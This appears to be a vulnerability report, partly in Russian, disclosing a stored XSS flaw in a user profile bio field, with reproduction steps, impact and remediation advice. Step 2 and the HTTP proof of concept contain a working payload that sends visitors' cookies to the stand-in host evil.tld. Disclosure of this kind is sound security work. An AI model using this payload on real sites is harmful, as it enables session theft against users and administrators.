### Description
Поле bio в профиле пользователя сохраняется без санитизации и рендерится как HTML на странице просмотра профиля, что позволяет внедрить JavaScript, выполняемый в контексте любого посетителя профиля.

*Affected Component:* `PUT /api/v2/user/profile`

### Technical Analysis

**How the vulnerability works:**
1) Payload сохраняется в БД. 2) При рендере профиля значение попадает в innerHTML. 3) onerror-обработчик выполняется в origin приложения.

**Why the security control fails:**
Входная фильтрация блокирует тег <script>, но не event handlers; CSP разрешает inline-скрипты

**Trust boundary violated:**
Данные, контролируемые атакующим (bio), исполняются как код в браузере жертвы (данные → код)

### Steps to Reproduce

1. Зарегистрировать аккаунт A, зайти в настройки профиля
2. В поле bio вставить: <img src=x onerror="fetch('//evil.tld/?c='+document.cookie)">
3. Сохранить профиль (PUT /api/v2/user/profile)
4. Аккаунтом B (или админом) открыть страницу профиля A
5. Наблюдать: выполняется JS, cookie отправляется на evil.tld

### Proof of Concept

```
PUT /api/v2/user/profile HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=A...

{"bio": "<img src=x onerror=\"fetch('//evil.tld/?c='+document.cookie)\">"}
```

### Impact

**Data exposure / Access escalation:**
Кража сессии любого пользователя (включая админа), просмотревшего профиль; действия от его имени

**Attack preconditions:**
Аккаунт с возможностью редактирования bio; жертва должна открыть профиль

**Realistic abuse scenario:**
Атакующий готовит профиль, отправляет ссылку на свой профиль поддержке/админу, получает их сессию

### Recommendation
Использовать textContent вместо innerHTML при рендере bio; добавить CSP с nonce и запретом inline-скриптов; на входе — серверную санитизацию (DOMPurify) с allowlist.

---
*CVSS: AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N (8.7) | Severity: High | 2026-10-29*